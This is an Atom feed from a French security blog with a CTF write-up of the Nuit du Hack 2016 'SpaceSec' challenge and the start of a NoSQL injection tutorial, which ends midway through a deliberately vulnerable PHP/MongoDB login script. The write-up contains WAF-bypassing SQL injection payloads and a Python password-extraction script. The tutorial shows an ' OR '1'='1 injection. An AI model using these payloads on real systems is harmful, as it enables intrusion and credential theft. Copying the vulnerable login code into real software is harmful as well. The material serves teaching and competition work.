@@ -1,0 +1,412 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Daily Security - SQL</title><link href="https://www.dailysecurity.fr/" rel="alternate"></link><link href="https://www.dailysecurity.fr/tag/sql/feed/index.xhtml" rel="self"></link><id>https://www.dailysecurity.fr/</id><updated>2016-04-04T09:08:00+02:00</updated><entry><title>Nuit du Hack Quals 2016 – SpaceSec – Write-Up</title><link href="https://www.dailysecurity.fr/write-up-ndh-quals-2016-spacesec" rel="alternate"></link><published>2016-04-04T09:08:00+02:00</published><updated>2016-04-04T09:08:00+02:00</updated><author><name>Geluchat</name></author><id>tag:www.dailysecurity.fr,2016-04-04:/write-up-ndh-quals-2016-spacesec</id><summary type="html">&lt;p&gt;Le week-end dernier, j'ai participé aux qualifications de la Nuit du Hack 2016 avec l'équipe khack40. Les 10 premières équipes recevaient des places gratuites pour la Nuit du Hack (début juillet) ainsi que la possibilité de participer au CTF privé lors de l’événement , et comme l'année dernière nous n'avons …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Le week-end dernier, j'ai participé aux qualifications de la Nuit du Hack 2016 avec l'équipe khack40. Les 10 premières équipes recevaient des places gratuites pour la Nuit du Hack (début juillet) ainsi que la possibilité de participer au CTF privé lors de l’événement , et comme l'année dernière nous n'avons malheureusement pas réussi à nous qualifier.&lt;/p&gt;
+&lt;p&gt;Nous avons tout de même atteint la 11ème place (la place ingrate) ce qui est mieux que l'année précédente où après un rush infernal des autres équipes pendant la nuit nous avions finalement fini 28ème.&lt;/p&gt;
+&lt;p&gt;Comme chaque année le guessing était présent (la stéganographie principalement) mais cela ne m'a pas empêché de trouver des épreuves intéressantes comme l'épreuve de web que je vais vous présenter.&lt;/p&gt;
+&lt;h3&gt;SpaceSec 300 pts&lt;/h3&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec.png" alt="SpaceSec Challenge" style="width: 70%;"&gt;&lt;/p&gt;
+&lt;p&gt;La page est basique, un bon vieux challenge fait avec Bootstrap.&lt;/p&gt;
+&lt;p&gt;On remarque que tous les articles proposés contiennent les mêmes descriptions, seuls les numéros de CVE et les auteurs semblent changer.&lt;/p&gt;
+&lt;p&gt;En cliquant sur Older Post on obtient une adresse du type:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=6&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Si on change un peu l'offset on obtient :&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec-User-Flag.png" alt="SpaceSec Challenge User Flag" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;p&gt;Oh un utilisateur qui s'appelle Flag...&lt;/p&gt;
+&lt;p&gt;Soyons fou, tentons la SQL injection directement :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=6'&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Waf.png" alt="SpaceSec Waf" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;p&gt;Bon, ça ne marche pas très bien, voyons voir si l'on peut au moins déclencher une erreur SQL:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=-1&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_-1.png" alt="SpaceSec SQLi" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;p&gt;Yeah, une belle erreur SQL !&lt;/p&gt;
+&lt;p&gt;En résumé, nous avons :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Un utilisateur Flag&lt;/li&gt;
+&lt;li&gt;Un offset modifiable d'une requête SQL&lt;/li&gt;
+&lt;li&gt;Une erreur SQL&lt;/li&gt;
+&lt;li&gt;Un affichage du numéro de l'erreur SQL&lt;/li&gt;
+&lt;li&gt;Un WAF maison (un pare-feu pour le Web)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Après un petit temps de réflexion on en vient à deux remarques :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Le WAF se bypass facilement à coups de %0a pour les espaces et de changements de casse (SeLEcT par exemple)&lt;/li&gt;
+&lt;li&gt;On ne peut pas faire d'UNION, la requête contient donc probablement un order by.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;La requête est donc dans le genre:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;FROM&lt;/span&gt; &lt;span class="nx"&gt;latable&lt;/span&gt; &lt;span class="nx"&gt;ORDER&lt;/span&gt; &lt;span class="nx"&gt;BY&lt;/span&gt; &lt;span class="nb"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="nx"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="nx"&gt;OFFSET&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;offset&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Quelques recherches sur le web nous permettent de trouver un bypass assez sympathique à coup de procédure SQL.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://raijee1337.blogspot.fr/2015/07/bypassing-incorrect-usage-of-union-and-order-by.html"&gt;L'article&lt;/a&gt; en question nous parle de l'utilisation de la procédure ANALYSE qui est présente dans mysql de base.&lt;/p&gt;
+&lt;p&gt;C'est presque trop beau pour être vrai, et... en effet ça l'est !&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=1%a0PRoCEDuRE%a0aNaLYSE%0a(eXtractValue%0a(0,1),1)--&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Error1108-1.png" alt="Error1108" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;p&gt;La page ne nous ressort que le numéro de l'erreur...&lt;/p&gt;
+&lt;p&gt;Alors, que faire pour contourner ce problème?&lt;/p&gt;
+&lt;p&gt;Eh bien, la réponse est simple, il suffit juste de faire une time-based injection !&lt;/p&gt;
+&lt;p&gt;Et... ça ne fonctionne pas, l'auteur du challenge à décidé de bloquer les fonctions sleep et benchmark...&lt;/p&gt;
+&lt;p&gt;Qu'à cela ne tienne, on passe donc par des heavy query !&lt;/p&gt;
+&lt;p&gt;On récupère plein de fois information_schema pour faire ramer la page et... information_schema est bloqué aussi ?!&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/imdone.gif" alt="Im done" style="width: 50%;"/&gt; &lt;/p&gt;
+&lt;p&gt;Je décide donc d'aller me coucher sur un échec. Ce fut à la fois une bonne et une mauvaise idée :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;J'ai trouvé la réponse dans la nuit&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Je n'ai pas dormi avant de l'avoir trouvée&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;De retour le lendemain &lt;s&gt;matin&lt;/s&gt; après-midi, je décide de tenter ma trouvaille :&lt;/p&gt;
+&lt;p&gt;Une SQL injection Boolean Based Into Double Error Based (oui, j'ai inventé le nom, mais ça en jette non?).&lt;/p&gt;
+&lt;p&gt;J'explique, on va tenter de faire passer une condition dans notre extractvalue, si cette condition est vraie on lui fait faire un convert(9990130101,date), la date étant complétement fausse la fonction plante et retourne NULL, sinon, on retourne 1.&lt;/p&gt;
+&lt;p&gt;Ce qu'il faut savoir, c'est que la procédure ANALYSE n'aime pas avoir un paramètre à NULL, elle crash donc un message d'&lt;a href="http://dev.mysql.com/doc/refman/5.0/en/error-messages-server.html#error_er_wrong_parameters_to_procedure"&gt;erreur 1108&lt;/a&gt; qui signifie "Message: Incorrect parameters to procedure '%s'"&lt;/p&gt;
+&lt;p&gt;En revanche si on lui envoie 1 en premier paramètre elle nous renvoie juste une erreur &lt;a href="http://dev.mysql.com/doc/refman/5.0/en/error-messages-server.html#error_er_unknown_error"&gt;1105&lt;/a&gt; : "Message: Unknown error"&lt;/p&gt;
+&lt;p&gt;On peut tester avec:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=1 PRoCEDuRE aNaLYSE ( (selEct exTractvalue (rAnd (),coNcat (0x3a, (case when (substring(1,1,1)=1) then convert(9990130101,date) else 1 end)))),1)--&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;J'ai remplacé les %0a par des espaces pour un souci de compréhension.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Error1108-1.png" alt="Error1108" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=1 PRoCEDuRE aNaLYSE ( (selEct exTractvalue (rAnd (),coNcat (0x3a, (case when (substring(1,1,1)!=1) then convert(9990130101,date) else 1 end)))),1)--&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Error1105.png" alt="Error1105" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;p&gt;A partir de là on peut tout simplement récupérer le mot de passe de l'utilisateur Flag dans la base de données.&lt;/p&gt;
+&lt;p&gt;Je vous épargne le temps afin de trouver la bonne table avec les bonnes colonnes (totalement au hasard).&lt;/p&gt;
+&lt;p&gt;Au final, on trouve une table users avec les colonnes id, username et password.&lt;/p&gt;
+&lt;p&gt;Ni une, ni deux, on code un petit script qui récupère tout ça.&lt;/p&gt;
+&lt;p&gt;Ayant une petite dent contre la programmation, je vous présente mon modeste script qui n'est pas optimisé mais qui fait le taf' :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python2&lt;/span&gt;
+&lt;span class="c1"&gt;# -*- coding: utf8 -*-&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nn"&gt;time&lt;/span&gt;
+
+&lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PHPSESSID&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;cl4r4m0rg4ne1sg00dbUt1pr3f3r3L3xiB3ll3&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;
+
+&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="mi"&gt;127&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://spacesec.quals.nuitduhack.com/index.php?offset=1&lt;/span&gt;&lt;span class="si"&gt;%a&lt;/span&gt;&lt;span class="s2"&gt;0PRoCEDuRE&lt;/span&gt;&lt;span class="si"&gt;%a&lt;/span&gt;&lt;span class="s2"&gt;0aNaLYSE&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(selEct&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;exTractvalue&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(rAnd&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(),coNcat&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(0x3a,&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(case&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;when&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(substring(&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(selEct&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;password&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;fRom&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;users&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;wHere&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;username&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;liKe&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;0x464c4147),&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;,1)=char(&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;))&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;then&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;convert(9990130101,date)&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;else&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;1&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;end)))),1)--&amp;quot;&lt;/span&gt;
+    &lt;span class="n"&gt;resultat&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;
+    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;forge&lt;/span&gt;
+    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;resultat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1108&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;!=-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt;
+        &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;
+    &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+
+&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[+] Le password est: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On obtient un mot de passe qui ressemble à un hash de 128 caractères en majuscule.&lt;/p&gt;
+&lt;p&gt;La partie rigolote de l'histoire est que j'ai cherché pendant une bonne demi-heure quoi en faire et au final Mastho, un membre de mon équipe, l'a valider en 5 secondes en m'expliquant qu'il avait juste mis le hash en minuscule...&lt;/p&gt;
+&lt;p&gt;En définitive, une épreuve bien marrante avec des protections assez funs.&lt;/p&gt;
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon Twitter pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="L'actualité commentée"></category><category term="WriteUp"></category><category term="NDH"></category><category term="CTF"></category><category term="SQL"></category></entry><entry><title>Les NOSQL injections Classique et Blind: Never trust user input</title><link href="https://www.dailysecurity.fr/nosql-injections-classique-blind" rel="alternate"></link><published>2015-02-22T05:21:00+01:00</published><updated>2015-02-22T05:21:00+01:00</updated><author><name>Geluchat</name></author><id>tag:www.dailysecurity.fr,2015-02-22:/nosql-injections-classique-blind</id><summary type="html">&lt;p&gt;Les bases de données NOSQL ont été créées pour répondre au problème de latence des SGBD relationnels sur de grosses bases de données.&lt;/p&gt;
+&lt;p&gt;On peut en citer plusieurs telles que:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DynamoDB&lt;/li&gt;
+&lt;li&gt;MongoDB&lt;/li&gt;
+&lt;li&gt;Oracle NoSQL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Néanmoins, l'apparition de ce nouveau moyen de stockage a fait émerger un type de faille innovant …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Les bases de données NOSQL ont été créées pour répondre au problème de latence des SGBD relationnels sur de grosses bases de données.&lt;/p&gt;
+&lt;p&gt;On peut en citer plusieurs telles que:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DynamoDB&lt;/li&gt;
+&lt;li&gt;MongoDB&lt;/li&gt;
+&lt;li&gt;Oracle NoSQL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Néanmoins, l'apparition de ce nouveau moyen de stockage a fait émerger un type de faille innovant: La NOSQL injections.&lt;/p&gt;
+&lt;p&gt;Pour ceux souhaitant tester chez eux, je leur conseille ce &lt;a href="http://www.pronique.com/blog/installing-mongodb-on-windows-the-wamp-way"&gt;tutoriel&lt;/a&gt; pour installer MongoDB sur Wamp, ainsi que &lt;a href="http://www.9lessons.info/2013/01/mongodb-php-tutorial.html"&gt;celui ci&lt;/a&gt; pour l'utilisation avec PHP.&lt;/p&gt;
+&lt;p&gt;Entrons maintenant dans le vif du sujet.&lt;/p&gt;
+&lt;p&gt;Tout le monde connait les &lt;a href="https://www.dailysecurity.fr/images/sql_injection_comic_small.png"&gt;SQL injections&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Ces dernières reposent sur la création une requête SQL basée sur une string:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;$query&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SELECT * FROM users where login=&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;$_GET[login]&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Avec $_GET[login] égale à ' OR '1'='1 cela donne:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;$query&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SELECT * FROM users where login=&amp;#39; &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Rien de très nouveaux.&lt;/p&gt;
+&lt;p&gt;Pour les NOSQL injections, la porte d'entrée passe par la création d'un tableau pour faire la requête, pour vous expliquer voici un script basique d'authentification avec MongoDB:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usr_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usr_password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
+        &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nv"&gt;$usr_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usr_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+        &lt;span class="nv"&gt;$usr_password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usr_password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+     &lt;span class="nv"&gt;$con&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;MongoClient&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// Connexion a MongoDB&lt;/span&gt;
+
+     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$con&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;// Si la connexion a fonctionné&lt;/span&gt;
+          &lt;span class="p"&gt;{&lt;/span&gt;
+
+          &lt;span class="nv"&gt;$db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$con&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;test&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+          &lt;span class="nv"&gt;$people&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;people&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+          &lt;span class="nv"&gt;$qry&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+               &lt;span class="s2"&gt;&amp;quot;user&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$usr_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+               &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$usr_password&lt;/span&gt;
+          &lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Construction de la requête NOSQL&lt;/span&gt;
+
+          &lt;span class="nv"&gt;$result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$people&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;findOne&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$qry&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Recherche de l&amp;#39;utilisateur&lt;/span&gt;
+          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;// Si les identifiants correspondes on connecte l&amp;#39;utilisateur&lt;/span&gt;
+               &lt;span class="p"&gt;{&lt;/span&gt;
+               &lt;span class="k"&gt;echo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Bienvenue Administrateur&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Zone Admin&lt;/span&gt;
+               &lt;span class="k"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+               &lt;span class="p"&gt;}&lt;/span&gt;
+          &lt;span class="p"&gt;}&lt;/span&gt;
+       &lt;span class="k"&gt;else&lt;/span&gt;
+          &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Mongo DB not installed&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+          &lt;span class="p"&gt;}&lt;/span&gt;
+     &lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="k"&gt;echo&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
+&lt;span class="s1"&gt;     &amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;     Login:&lt;/span&gt;
+&lt;span class="s1"&gt;     &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;usr_name&amp;quot; name=&amp;quot;usr_name&amp;quot;  /&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;     Password:&lt;/span&gt;
